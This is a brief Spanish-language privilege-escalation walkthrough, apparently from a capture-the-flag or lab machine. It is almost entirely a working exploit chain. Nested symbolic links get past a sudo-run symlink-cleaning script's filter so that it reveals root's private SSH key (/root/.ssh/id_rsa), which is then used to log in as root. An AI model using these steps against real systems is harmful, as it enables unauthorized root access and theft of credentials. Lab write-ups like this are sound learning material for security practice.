Escalada de Privilegios

Interpretar código

# Argumento fichero.png
# Archivo es un link simbólico
# Ruta del link simbólico no debe contener ni etc ni root

Leer clave privada de root

ln -s /root/.ssh/id_rsa file.txt
ln -s /home/bob/file.txt file.png
# Setear CHECK_CONTENT a true para que me ejecute el link de file.txt al no ser .png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh file.png

Crear fichero id_rsa en el directorio actual con el contenido de root id_rsa

nano root_id_rsa
chmod 600 root_id_rsa
ssh -i root_id_rsa root@localhost
